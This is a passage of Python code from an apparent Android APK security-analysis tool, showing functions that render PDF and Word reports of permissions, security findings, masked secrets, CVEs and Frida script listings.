    dynamic_analysis: Optional[Dict[str, Any]] = None
) -> bytes:
    """
    Generate a PDF report for APK analysis.
    
    Args:
        result: APK analysis result
        report_type: "functionality", "security", or "both"
        decompiled_code_findings: Optional list of findings from pattern-based scanners
        cve_scan_results: Optional list of CVE findings from dependency scanning
        ai_architecture_diagram: Optional Mermaid diagram for app architecture
        ai_attack_surface_map: Optional Mermaid diagram for attack surface
        dynamic_analysis: Optional Frida scripts and dynamic analysis data
    
    Returns:
        PDF bytes
    """
    try:
        from reportlab.lib import colors
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.units import inch
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
        import io
        
        buffer = io.BytesIO()
        doc = SimpleDocTemplate(buffer, pagesize=letter, topMargin=0.75*inch, bottomMargin=0.75*inch)
        
        styles = getSampleStyleSheet()
        
        # Custom styles
        styles.add(ParagraphStyle(
            name='Title',
            parent=styles['Heading1'],
            fontSize=24,
            spaceAfter=20,
            textColor=colors.HexColor("#1e40af")
        ))
        styles.add(ParagraphStyle(
            name='SectionHeader',
            parent=styles['Heading2'],
            fontSize=16,
            spaceBefore=20,
            spaceAfter=10,
            textColor=colors.HexColor("#1e40af")
        ))
        styles.add(ParagraphStyle(
            name='SubHeader',
            parent=styles['Heading3'],
            fontSize=12,
            spaceBefore=15,
            spaceAfter=8,
            textColor=colors.HexColor("#374151")
        ))
        styles.add(ParagraphStyle(
            name='Body',
            parent=styles['Normal'],
            fontSize=10,
            spaceAfter=6,
            leading=14
        ))
        styles.add(ParagraphStyle(
            name='Code',
            parent=styles['Normal'],
            fontSize=9,
            fontName='Courier',
            backColor=colors.HexColor("#f3f4f6"),
            leftIndent=10
        ))
        styles.add(ParagraphStyle(
            name='BulletItem',
            parent=styles['Normal'],
            fontSize=10,
            leftIndent=20,
            spaceAfter=4
        ))
        
        story = []
        
        # Title
        story.append(Paragraph("APK Analysis Report", styles['Title']))
        story.append(Spacer(1, 10))
        
        # App Info Table
        app_info = [
            ["Package", result.package_name],
            ["App Name", result.app_name or "Unknown"],
            ["Version", f"{result.version_name} ({result.version_code})"],
            ["Min SDK", str(result.min_sdk)],
            ["Target SDK", str(result.target_sdk)],
        ]
        t = Table(app_info, colWidths=[1.5*inch, 4*inch])
        t.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (0, -1), colors.HexColor("#f3f4f6")),
            ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('PADDING', (0, 0), (-1, -1), 8),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#e5e7eb")),
        ]))
        story.append(t)
        story.append(Spacer(1, 20))
        
        # ==================== FUNCTIONALITY SECTION ====================
        if report_type in ["functionality", "both"]:
            story.append(Paragraph("What Does This APK Do", styles['SectionHeader']))
            story.append(Spacer(1, 10))
            
            # Components summary
            story.append(Paragraph("App Components", styles['SubHeader']))
            components = [
                ["Component Type", "Count"],
                ["Activities", str(len(result.activities))],
                ["Services", str(len(result.services))],
                ["Receivers", str(len(result.receivers))],
                ["Providers", str(len(result.providers))],
            ]
            t = Table(components, colWidths=[2*inch, 1*inch])
            t.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1e40af")),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, -1), 10),
                ('PADDING', (0, 0), (-1, -1), 8),
                ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#e5e7eb")),
                ('ALIGN', (1, 0), (1, -1), 'CENTER'),
            ]))
            story.append(t)
            story.append(Spacer(1, 15))
            
            # Permissions
            story.append(Paragraph("Permissions", styles['SubHeader']))
            dangerous_perms = [p for p in result.permissions if p.is_dangerous]
            story.append(Paragraph(f"Total: {len(result.permissions)} | Dangerous: {len(dangerous_perms)}", styles['Body']))
            
            if dangerous_perms:
                story.append(Spacer(1, 5))
                story.append(Paragraph("Dangerous Permissions:", styles['Body']))
                for perm in dangerous_perms[:10]:
                    name = perm.name.replace('android.permission.', '')
                    story.append(Paragraph(f" {name}", styles['BulletItem']))
            
            story.append(Spacer(1, 15))
            
            # Native libraries
            if result.native_libraries:
                story.append(Paragraph("Native Libraries", styles['SubHeader']))
                for lib in result.native_libraries[:8]:
                    story.append(Paragraph(f" {lib}", styles['BulletItem']))
            
            if report_type == "both":
                story.append(PageBreak())
        
        # ==================== SECURITY SECTION ====================
        if report_type in ["security", "both"]:
            story.append(Paragraph("Security Findings", styles['SectionHeader']))
            story.append(Spacer(1, 10))
            
            # Security Summary
            summary_data = [
                ["Metric", "Value", "Status"],
                ["Security Issues", str(len(result.security_issues)), "" if result.security_issues else ""],
                ["Secrets Found", str(len(result.secrets)), "" if result.secrets else ""],
                ["Debuggable", "Yes" if result.debuggable else "No", "" if result.debuggable else ""],
                ["Allows Backup", "Yes" if result.allow_backup else "No", "" if result.allow_backup else ""],
            ]
            t = Table(summary_data, colWidths=[2*inch, 1.5*inch, 0.5*inch])
            t.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#dc2626")),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, -1), 10),
                ('PADDING', (0, 0), (-1, -1), 8),
                ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#e5e7eb")),
                ('ALIGN', (1, 0), (-1, -1), 'CENTER'),
            ]))
            story.append(t)
            story.append(Spacer(1, 20))
            
            # Security Issues by Severity
            if result.security_issues:
                story.append(Paragraph("Security Issues", styles['SubHeader']))
                
                severity_colors = {
                    'critical': colors.HexColor("#dc2626"),
                    'high': colors.HexColor("#ea580c"),
                    'medium': colors.HexColor("#ca8a04"),
                    'low': colors.HexColor("#16a34a"),
                    'info': colors.HexColor("#6b7280"),
                }
                
                for issue in result.security_issues[:15]:
                    sev = issue.get('severity', 'info').lower()
                    color = severity_colors.get(sev, colors.black)
                    story.append(Paragraph(
                        f"<font color='{color}'>[{sev.upper()}]</font> <b>{issue.get('category', 'Unknown')}:</b> {issue.get('description', '')}",
                        styles['BulletItem']
                    ))
                story.append(Spacer(1, 15))
            
            # Secrets
            if result.secrets:
                story.append(Paragraph("Hardcoded Secrets", styles['SubHeader']))
                secrets_data = [["Type", "Value (Masked)", "Severity"]]
                for secret in result.secrets[:10]:
                    secrets_data.append([
                        secret.get('type', 'Unknown'),
                        secret.get('masked_value', '***')[:40],
                        secret.get('severity', 'Unknown')
                    ])
                t = Table(secrets_data, colWidths=[1.5*inch, 3*inch, 1*inch])
                t.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#7f1d1d")),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, -1), 9),
                    ('PADDING', (0, 0), (-1, -1), 6),
                    ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#e5e7eb")),
                ]))
                story.append(t)
                story.append(Spacer(1, 15))
            
            # Certificate
            if result.certificate:
                story.append(Paragraph("Certificate Analysis", styles['SubHeader']))
                cert = result.certificate
                cert_status = "DEBUG CERTIFICATE - INSECURE" if cert.is_debug_cert else "Production Certificate"
                cert_data = [
                    ["Status", cert_status],
                    ["Subject", cert.subject[:60] if cert.subject else "Unknown"],
                    ["Valid From", cert.valid_from or "Unknown"],
                    ["Valid Until", cert.valid_until or "Unknown"],
                    ["Signature", cert.signature_version or "Unknown"],
                ]
                t = Table(cert_data, colWidths=[1.5*inch, 4*inch])
                t.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (0, -1), colors.HexColor("#fef2f2") if cert.is_debug_cert else colors.HexColor("#f0fdf4")),
                    ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, -1), 9),
                    ('PADDING', (0, 0), (-1, -1), 6),
                    ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#e5e7eb")),
                ]))
                story.append(t)
            
            # Decompiled Code Vulnerability Scan
            if decompiled_code_findings:
                story.append(PageBreak())
                story.append(Paragraph("Source Code Vulnerability Scan", styles['SectionHeader']))
                story.append(Paragraph(
                    f"Pattern-based security analysis found {len(decompiled_code_findings)} potential vulnerabilities in decompiled source code.",
                    styles['Body']
                ))
                story.append(Spacer(1, 10))
                
                # Group by severity
                severity_order = ['critical', 'high', 'medium', 'low', 'info']
                severity_colors_scan = {
                    'critical': colors.HexColor("#dc2626"),
                    'high': colors.HexColor("#ea580c"),
                    'medium': colors.HexColor("#ca8a04"),
                    'low': colors.HexColor("#16a34a"),
                    'info': colors.HexColor("#6b7280"),
                }
                
                findings_by_sev = {}
                for f in decompiled_code_findings:
                    sev = f.get('severity', 'info').lower()
                    if sev not in findings_by_sev:
                        findings_by_sev[sev] = []
                    findings_by_sev[sev].append(f)
                
                for sev in severity_order:
                    if sev in findings_by_sev:
                        sev_findings = findings_by_sev[sev]
                        color = severity_colors_scan.get(sev, colors.black)
                        story.append(Paragraph(
                            f"<font color='{color}'><b>{sev.upper()} ({len(sev_findings)})</b></font>",
                            styles['SubHeader']
                        ))
                        
                        for finding in sev_findings[:10]:  # Limit per severity
                            title = finding.get('title', 'Unknown Issue')
                            file_path = finding.get('file_path', 'Unknown file')
                            line = finding.get('line_number', 0)
                            category = finding.get('category', 'Unknown')
                            cwe = finding.get('cwe_id', '')
                            
                            story.append(Paragraph(
                                f"<b> {title}</b>",
                                styles['BulletItem']
                            ))
                            story.append(Paragraph(
                                f"  Location: {file_path}:{line} | Category: {category}" + (f" | CWE: {cwe}" if cwe else ""),
                                styles['BulletItem']
                            ))
                            
                            if finding.get('exploitation'):
                                story.append(Paragraph(
                                    f"  <i>Exploitation: {finding.get('exploitation')[:200]}</i>",
                                    styles['BulletItem']
                                ))
                            story.append(Spacer(1, 5))
                        
                        if len(sev_findings) > 10:
                            story.append(Paragraph(
                                f"  <i>...and {len(sev_findings) - 10} more {sev} findings</i>",
                                styles['BulletItem']
                            ))
                        story.append(Spacer(1, 10))
        
        # ==================== CVE SCAN RESULTS ====================
        if cve_scan_results:
            story.append(PageBreak())
            story.append(Paragraph("Known CVEs in Dependencies", styles['SectionHeader']))
            story.append(Paragraph(
                f"<b>Total CVEs Found:</b> {len(cve_scan_results)}",
                styles['Body']
            ))
            story.append(Spacer(1, 10))
            
            # Group by severity
            severity_order = ['critical', 'high', 'medium', 'low']
            cve_severity_colors = {
                'critical': colors.HexColor("#dc2626"),
                'high': colors.HexColor("#ea580c"),
                'medium': colors.HexColor("#ca8a04"),
                'low': colors.HexColor("#16a34a"),
            }
            
            cves_by_sev = {}
            for cve in cve_scan_results:
                sev = cve.get('severity', 'medium').lower()
                if sev not in cves_by_sev:
                    cves_by_sev[sev] = []
                cves_by_sev[sev].append(cve)
            
            for sev in severity_order:
                if sev in cves_by_sev:
                    sev_cves = cves_by_sev[sev]
                    color = cve_severity_colors.get(sev, colors.black)
                    story.append(Paragraph(
                        f"<font color='{color}'><b>{sev.upper()} ({len(sev_cves)})</b></font>",
                        styles['SubHeader']
                    ))
                    
                    for cve in sev_cves[:10]:  # Limit per severity
                        cve_id = cve.get('cve_id', 'Unknown')
                        package = cve.get('package', 'Unknown')
                        version = cve.get('version', 'Unknown')
                        summary = cve.get('summary', 'No description')[:150]
                        cvss = cve.get('cvss_score', '')
                        fixed = cve.get('fixed_version', '')
                        
                        story.append(Paragraph(
                            f"<b> {cve_id}</b>",
                            styles['BulletItem']
                        ))
                        story.append(Paragraph(
                            f"  Package: {package} v{version}" + (f" | CVSS: {cvss}" if cvss else ""),
                            styles['BulletItem']
                        ))
                        story.append(Paragraph(
                            f"  {summary}",
                            styles['BulletItem']
                        ))
                        if fixed:
                            story.append(Paragraph(
                                f"  <i>Fixed in: v{fixed}</i>",
                                styles['BulletItem']
                            ))
                        story.append(Spacer(1, 5))
                    
                    if len(sev_cves) > 10:
                        story.append(Paragraph(
                            f"  <i>...and {len(sev_cves) - 10} more {sev} CVEs</i>",
                            styles['BulletItem']
                        ))
                    story.append(Spacer(1, 10))
        
        # ==================== FRIDA SCRIPTS ====================
        if dynamic_analysis and dynamic_analysis.get('frida_scripts'):
            story.append(PageBreak())
            story.append(Paragraph("Frida Scripts for Dynamic Testing", styles['SectionHeader']))
            story.append(Paragraph(
                "Auto-generated Frida scripts based on static analysis findings. These scripts can be used "
                "to bypass security protections and monitor sensitive operations during dynamic testing.",
                styles['Body']
            ))
            story.append(Spacer(1, 10))
            
            # Detection Summary
            detections = dynamic_analysis.get('detections', {})
            if detections:
                story.append(Paragraph("Security Protection Detection", styles['SubHeader']))
                
                detection_data = [
                    ["Protection", "Detected"],
                    ["SSL/TLS Pinning", "Yes " if detections.get('ssl_pinning_detected') else "No"],
                    ["Root Detection", "Yes " if detections.get('root_detection_detected') else "No"],
                    ["Emulator Detection", "Yes " if detections.get('emulator_detection_detected') else "No"],
                    ["Anti-Debugging", "Yes " if detections.get('anti_debug_detected') else "No"],
                    ["Anti-Tampering", "Yes " if detections.get('anti_tampering_detected') else "No"],
                ]
                
                det_table = Table(detection_data, colWidths=[2.5*inch, 1.5*inch])
                det_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1e40af")),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, -1), 9),
                    ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
                    ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                    ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor("#f9fafb")),
                ]))
                story.append(det_table)
                story.append(Spacer(1, 15))
            
            # Quick Start Commands
            if dynamic_analysis.get('frida_spawn_command') or dynamic_analysis.get('frida_attach_command'):
                story.append(Paragraph("Quick Start Commands", styles['SubHeader']))
                
                if dynamic_analysis.get('frida_spawn_command'):
                    story.append(Paragraph("<b>Spawn Mode</b> (starts app with hooks):", styles['Body']))
                    story.append(Paragraph(
                        f"<font face='Courier' size='8'>{dynamic_analysis['frida_spawn_command']}</font>",
                        styles['Code']
                    ))
                    story.append(Spacer(1, 5))
                
                if dynamic_analysis.get('frida_attach_command'):
                    story.append(Paragraph("<b>Attach Mode</b> (hooks running app):", styles['Body']))
                    story.append(Paragraph(
                        f"<font face='Courier' size='8'>{dynamic_analysis['frida_attach_command']}</font>",
                        styles['Code']
                    ))
                story.append(Spacer(1, 15))
            
            # Scripts List
            scripts = dynamic_analysis.get('frida_scripts', [])
            if scripts:
                story.append(Paragraph(f"Available Scripts ({len(scripts)} total)", styles['SubHeader']))
                
                scripts_data = [["Script Name", "Category", "Description"]]
                for script in scripts:
                    scripts_data.append([
                        script.get('name', 'Unknown'),
                        script.get('category', 'general'),
                        script.get('description', 'No description')[:80] + ("..." if len(script.get('description', '')) > 80 else "")
                    ])
                
                scripts_table = Table(scripts_data, colWidths=[1.8*inch, 1.2*inch, 3.5*inch])
                scripts_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1e40af")),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, -1), 8),
                    ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
                    ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                    ('VALIGN', (0, 0), (-1, -1), 'TOP'),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor("#f9fafb")),
                    ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, colors.HexColor("#f3f4f6")]),
                ]))
                story.append(scripts_table)
                story.append(Spacer(1, 10))
                
                story.append(Paragraph(
                    "<i>Note: Full script code is available in the Markdown export or web interface.</i>",
                    styles['Body']
                ))
        
        # ==================== AI DIAGRAMS NOTE ====================
        if ai_architecture_diagram or ai_attack_surface_map:
            story.append(PageBreak())
            story.append(Paragraph("AI-Generated Diagrams", styles['SectionHeader']))
            story.append(Paragraph(
                "The following Mermaid diagrams are included in this analysis. To view them as rendered graphics, "
                "use the Markdown export or view the diagrams in the web interface.",
                styles['Body']
            ))
            story.append(Spacer(1, 10))
            
            if ai_architecture_diagram:
                story.append(Paragraph("Application Architecture Diagram", styles['SubHeader']))
                story.append(Paragraph(
                    "This diagram shows the architecture of the application including components, "
                    "services, and their interactions.",
                    styles['Body']
                ))
                # Include first 500 chars of Mermaid code
                diagram_preview = ai_architecture_diagram[:500] + ("..." if len(ai_architecture_diagram) > 500 else "")
                story.append(Paragraph(f"<font face='Courier' size='8'>{diagram_preview}</font>", styles['Body']))
                story.append(Spacer(1, 10))
            
            if ai_attack_surface_map:
                story.append(Paragraph("Attack Surface Map", styles['SubHeader']))
                story.append(Paragraph(
                    "This diagram maps potential attack vectors, entry points, and security-critical components.",
                    styles['Body']
                ))
                # Include first 500 chars of Mermaid code
                diagram_preview = ai_attack_surface_map[:500] + ("..." if len(ai_attack_surface_map) > 500 else "")
                story.append(Paragraph(f"<font face='Courier' size='8'>{diagram_preview}</font>", styles['Body']))
                story.append(Spacer(1, 10))
        
        doc.build(story)
        return buffer.getvalue()
        
    except ImportError as e:
        logger.error(f"PDF generation failed - missing dependency: {e}")
        raise RuntimeError("PDF export requires reportlab. Install with: pip install reportlab")


def generate_apk_docx_report(
    result: ApkAnalysisResult,
    report_type: str = "both",
    decompiled_code_findings: Optional[List[Dict]] = None,
    cve_scan_results: Optional[List[Dict]] = None,
    ai_architecture_diagram: Optional[str] = None,
    ai_attack_surface_map: Optional[str] = None,
    dynamic_analysis: Optional[Dict[str, Any]] = None
) -> bytes:
    """
    Generate a Word document report for APK analysis.
    
    Args:
        result: APK analysis result
        report_type: "functionality", "security", or "both"
        decompiled_code_findings: Optional list of findings from pattern-based scanners
        cve_scan_results: Optional list of CVE findings from dependency scanning
        ai_architecture_diagram: Optional Mermaid diagram for app architecture
        ai_attack_surface_map: Optional Mermaid diagram for attack surface
        dynamic_analysis: Optional Frida scripts and dynamic analysis data
    
    Returns:
        DOCX bytes
    """
    try:
        from docx import Document
        from docx.shared import Inches, Pt, RGBColor
        from docx.enum.text import WD_ALIGN_PARAGRAPH
        from docx.enum.table import WD_TABLE_ALIGNMENT
        import io
        
        doc = Document()
        
        # Title
        title = doc.add_heading('APK Analysis Report', 0)
        title.runs[0].font.color.rgb = RGBColor(30, 64, 175)
        
        # App Info
        doc.add_paragraph()
        info_table = doc.add_table(rows=5, cols=2)
        info_table.style = 'Table Grid'
        info_data = [
            ("Package", result.package_name),
            ("App Name", result.app_name or "Unknown"),
            ("Version", f"{result.version_name} ({result.version_code})"),
            ("Min SDK", str(result.min_sdk)),
            ("Target SDK", str(result.target_sdk)),
        ]
        for i, (label, value) in enumerate(info_data):
            info_table.rows[i].cells[0].text = label
            info_table.rows[i].cells[1].text = value
            info_table.rows[i].cells[0].paragraphs[0].runs[0].bold = True
        
        doc.add_paragraph()
        
        # ==================== FUNCTIONALITY SECTION ====================
        if report_type in ["functionality", "both"]:
            doc.add_heading('What Does This APK Do', 1)
            
            # Components
            doc.add_heading('App Components', 2)
            comp_table = doc.add_table(rows=5, cols=2)
            comp_table.style = 'Table Grid'
            comp_data = [
                ("Component Type", "Count"),
                ("Activities", str(len(result.activities))),
                ("Services", str(len(result.services))),
                ("Receivers", str(len(result.receivers))),
                ("Providers", str(len(result.providers))),
            ]
            for i, (label, value) in enumerate(comp_data):
                comp_table.rows[i].cells[0].text = label
                comp_table.rows[i].cells[1].text = value
                if i == 0:
                    comp_table.rows[i].cells[0].paragraphs[0].runs[0].bold = True
                    comp_table.rows[i].cells[1].paragraphs[0].runs[0].bold = True
            
            doc.add_paragraph()
            
            # Permissions
            doc.add_heading('Permissions', 2)
            dangerous_perms = [p for p in result.permissions if p.is_dangerous]
            doc.add_paragraph(f"Total: {len(result.permissions)} | Dangerous: {len(dangerous_perms)}")
            
            if dangerous_perms:
                doc.add_paragraph("Dangerous Permissions:", style='Intense Quote')
                for perm in dangerous_perms[:10]:
                    name = perm.name.replace('android.permission.', '')
                    doc.add_paragraph(name, style='List Bullet')
            
            # Native libraries
            if result.native_libraries:
                doc.add_heading('Native Libraries', 2)
                for lib in result.native_libraries[:8]:
                    doc.add_paragraph(lib, style='List Bullet')
            
            if report_type == "both":
                doc.add_page_break()
        
        # ==================== SECURITY SECTION ====================
        if report_type in ["security", "both"]:
            sec_heading = doc.add_heading('Security Findings', 1)
            sec_heading.runs[0].font.color.rgb = RGBColor(220, 38, 38)
            
            # Summary
            doc.add_heading('Security Summary', 2)
            summary_table = doc.add_table(rows=5, cols=3)
            summary_table.style = 'Table Grid'
            summary_data = [
                ("Metric", "Value", "Status"),
                ("Security Issues", str(len(result.security_issues)), "" if result.security_issues else ""),
                ("Secrets Found", str(len(result.secrets)), "" if result.secrets else ""),
                ("Debuggable", "Yes" if result.debuggable else "No", "" if result.debuggable else ""),
                ("Allows Backup", "Yes" if result.allow_backup else "No", "" if result.allow_backup else ""),
            ]
            for i, (metric, value, status) in enumerate(summary_data):
                summary_table.rows[i].cells[0].text = metric
                summary_table.rows[i].cells[1].text = value
                summary_table.rows[i].cells[2].text = status
                if i == 0:
                    for cell in summary_table.rows[i].cells:
                        cell.paragraphs[0].runs[0].bold = True
            
            doc.add_paragraph()
            
            # Security Issues
            if result.security_issues:
                doc.add_heading('Security Issues', 2)
                for issue in result.security_issues[:15]:
                    sev = issue.get('severity', 'info').upper()
                    cat = issue.get('category', 'Unknown')
                    desc = issue.get('description', '')
                    p = doc.add_paragraph()
                    run = p.add_run(f"[{sev}] ")
                    run.bold = True
                    if sev == 'CRITICAL':
                        run.font.color.rgb = RGBColor(220, 38, 38)
                    elif sev == 'HIGH':
                        run.font.color.rgb = RGBColor(234, 88, 12)
                    elif sev == 'MEDIUM':
                        run.font.color.rgb = RGBColor(202, 138, 4)
                    else:
                        run.font.color.rgb = RGBColor(22, 163, 74)
                    p.add_run(f"{cat}: ").bold = True
                    p.add_run(desc)
            
            # Secrets
            if result.secrets:
                doc.add_heading('Hardcoded Secrets', 2)
                secrets_table = doc.add_table(rows=len(result.secrets[:10]) + 1, cols=3)
                secrets_table.style = 'Table Grid'
                secrets_table.rows[0].cells[0].text = "Type"
                secrets_table.rows[0].cells[1].text = "Value (Masked)"
                secrets_table.rows[0].cells[2].text = "Severity"
                for cell in secrets_table.rows[0].cells:
                    cell.paragraphs[0].runs[0].bold = True
                
                for i, secret in enumerate(result.secrets[:10]):
                    secrets_table.rows[i+1].cells[0].text = secret.get('type', 'Unknown')
                    secrets_table.rows[i+1].cells[1].text = secret.get('masked_value', '***')[:40]
                    secrets_table.rows[i+1].cells[2].text = secret.get('severity', 'Unknown')
            
            # Certificate
            if result.certificate:
                doc.add_heading('Certificate Analysis', 2)
                cert = result.certificate
                cert_status = "DEBUG CERTIFICATE - INSECURE" if cert.is_debug_cert else "Production Certificate"
                
                p = doc.add_paragraph()
                p.add_run("Status: ").bold = True
                status_run = p.add_run(cert_status)
                if cert.is_debug_cert:
                    status_run.font.color.rgb = RGBColor(220, 38, 38)
                
                doc.add_paragraph(f"Subject: {cert.subject}")
                doc.add_paragraph(f"Valid: {cert.valid_from} to {cert.valid_until}")
                doc.add_paragraph(f"Signature: {cert.signature_version}")
            
            # Decompiled Code Vulnerability Scan
            if decompiled_code_findings:
                doc.add_page_break()
                doc.add_heading('Source Code Vulnerability Scan', 1)
                doc.add_paragraph(
                    f"Pattern-based security analysis found {len(decompiled_code_findings)} potential vulnerabilities in decompiled source code."
                )
                
                # Group by severity
                severity_order = ['critical', 'high', 'medium', 'low', 'info']
                severity_colors_docx = {
                    'critical': RGBColor(220, 38, 38),
                    'high': RGBColor(234, 88, 12),
                    'medium': RGBColor(202, 138, 4),
                    'low': RGBColor(22, 163, 74),
                    'info': RGBColor(107, 114, 128),
                }
                
                findings_by_sev = {}
                for f in decompiled_code_findings:
                    sev = f.get('severity', 'info').lower()
                    if sev not in findings_by_sev:
                        findings_by_sev[sev] = []
                    findings_by_sev[sev].append(f)
                
                for sev in severity_order:
                    if sev in findings_by_sev:
                        sev_findings = findings_by_sev[sev]
                        doc.add_heading(f'{sev.upper()} ({len(sev_findings)})', 2)
                        
                        for finding in sev_findings[:10]:  # Limit per severity
                            title = finding.get('title', 'Unknown Issue')
                            file_path = finding.get('file_path', 'Unknown file')
                            line = finding.get('line_number', 0)
                            category = finding.get('category', 'Unknown')
                            cwe = finding.get('cwe_id', '')
                            
                            # Title
                            p = doc.add_paragraph()
                            title_run = p.add_run(f" {title}")
                            title_run.bold = True
                            title_run.font.color.rgb = severity_colors_docx.get(sev, RGBColor(0, 0, 0))
                            
                            # Location
                            loc_p = doc.add_paragraph()
                            loc_p.add_run("  Location: ").bold = True
                            loc_p.add_run(f"{file_path}:{line}")
                            loc_p.add_run(" | Category: ").bold = True
                            loc_p.add_run(category)
                            if cwe:
                                loc_p.add_run(" | CWE: ").bold = True
                                loc_p.add_run(cwe)
                            
                            # Exploitation
                            if finding.get('exploitation'):
                                exp_p = doc.add_paragraph()
                                exp_p.add_run("  Exploitation: ").bold = True
                                exp_run = exp_p.add_run(finding.get('exploitation', '')[:200])
                                exp_run.italic = True
                            
                            # Code snippet
                            if finding.get('code_snippet'):
                                doc.add_paragraph(f"  Code: {finding.get('code_snippet', '')[:150]}...")
                        
                        if len(sev_findings) > 10:
                            doc.add_paragraph(f"  ...and {len(sev_findings) - 10} more {sev} findings")
        
        # ==================== CVE SCAN RESULTS ====================
        if cve_scan_results:
            doc.add_page_break()
            doc.add_heading('Known CVEs in Dependencies', 1)
            doc.add_paragraph(
                f"Dependency scanning found {len(cve_scan_results)} known CVEs in the application's libraries."
            )
            
            # Group by severity
            severity_order = ['critical', 'high', 'medium', 'low']
            cve_severity_colors = {
                'critical': RGBColor(220, 38, 38),
                'high': RGBColor(234, 88, 12),
                'medium': RGBColor(202, 138, 4),
                'low': RGBColor(22, 163, 74),
            }
            
            cves_by_sev = {}
            for cve in cve_scan_results:
                sev = cve.get('severity', 'medium').lower()
                if sev not in cves_by_sev:
                    cves_by_sev[sev] = []
                cves_by_sev[sev].append(cve)
            
            for sev in severity_order:
                if sev in cves_by_sev:
                    sev_cves = cves_by_sev[sev]
                    doc.add_heading(f'{sev.upper()} ({len(sev_cves)})', 2)
                    
                    for cve in sev_cves[:10]:  # Limit per severity
                        cve_id = cve.get('cve_id', 'Unknown')
                        package = cve.get('package', 'Unknown')
                        version = cve.get('version', 'Unknown')
                        summary = cve.get('summary', 'No description')[:150]
                        cvss = cve.get('cvss_score', '')
                        fixed = cve.get('fixed_version', '')
                        
                        # CVE ID
                        p = doc.add_paragraph()
                        title_run = p.add_run(f" {cve_id}")
                        title_run.bold = True
                        title_run.font.color.rgb = cve_severity_colors.get(sev, RGBColor(0, 0, 0))
                        
                        # Package info
                        pkg_p = doc.add_paragraph()
                        pkg_p.add_run("  Package: ").bold = True
                        pkg_p.add_run(f"{package} v{version}")
                        if cvss:
                            pkg_p.add_run(" | CVSS: ").bold = True
                            pkg_p.add_run(str(cvss))
                        
                        # Summary
                        sum_p = doc.add_paragraph()
                        sum_p.add_run(f"  {summary}")
                        
                        # Fixed version
                        if fixed:
                            fix_p = doc.add_paragraph()
                            fix_run = fix_p.add_run(f"  Fixed in: v{fixed}")
                            fix_run.italic = True
                    
                    if len(sev_cves) > 10:
                        doc.add_paragraph(f"  ...and {len(sev_cves) - 10} more {sev} CVEs")
        
        # ==================== FRIDA SCRIPTS ====================
        if dynamic_analysis and dynamic_analysis.get('frida_scripts'):
            doc.add_page_break()
            doc.add_heading('Frida Scripts for Dynamic Testing', 1)
            doc.add_paragraph(
                "Auto-generated Frida scripts based on static analysis findings. These scripts can be used "
                "to bypass security protections and monitor sensitive operations during dynamic testing."
            )
            
            # Detection Summary
            detections = dynamic_analysis.get('detections', {})
            if detections:
                doc.add_heading('Security Protection Detection', 2)
                
                det_table = doc.add_table(rows=6, cols=2)
                det_table.style = 'Table Grid'
                
                # Header row
                det_table.rows[0].cells[0].text = "Protection"
                det_table.rows[0].cells[1].text = "Detected"
                
                detection_items = [
                    ("SSL/TLS Pinning", detections.get('ssl_pinning_detected', False)),
                    ("Root Detection", detections.get('root_detection_detected', False)),
                    ("Emulator Detection", detections.get('emulator_detection_detected', False)),
                    ("Anti-Debugging", detections.get('anti_debug_detected', False)),
                    ("Anti-Tampering", detections.get('anti_tampering_detected', False)),
                ]
                
                for i, (label, detected) in enumerate(detection_items, 1):
                    det_table.rows[i].cells[0].text = label
                    det_table.rows[i].cells[1].text = "Yes " if detected else "No"
                
                doc.add_paragraph()
            
            # Quick Start Commands
            if dynamic_analysis.get('frida_spawn_command') or dynamic_analysis.get('frida_attach_command'):
                doc.add_heading('Quick Start Commands', 2)
                
                if dynamic_analysis.get('frida_spawn_command'):
                    p = doc.add_paragraph()
                    p.add_run("Spawn Mode").bold = True
                    p.add_run(" (starts app with hooks):")
                    
                    cmd_p = doc.add_paragraph()
                    cmd_run = cmd_p.add_run(dynamic_analysis['frida_spawn_command'])
                    cmd_run.font.name = 'Courier New'
                    cmd_run.font.size = Pt(9)
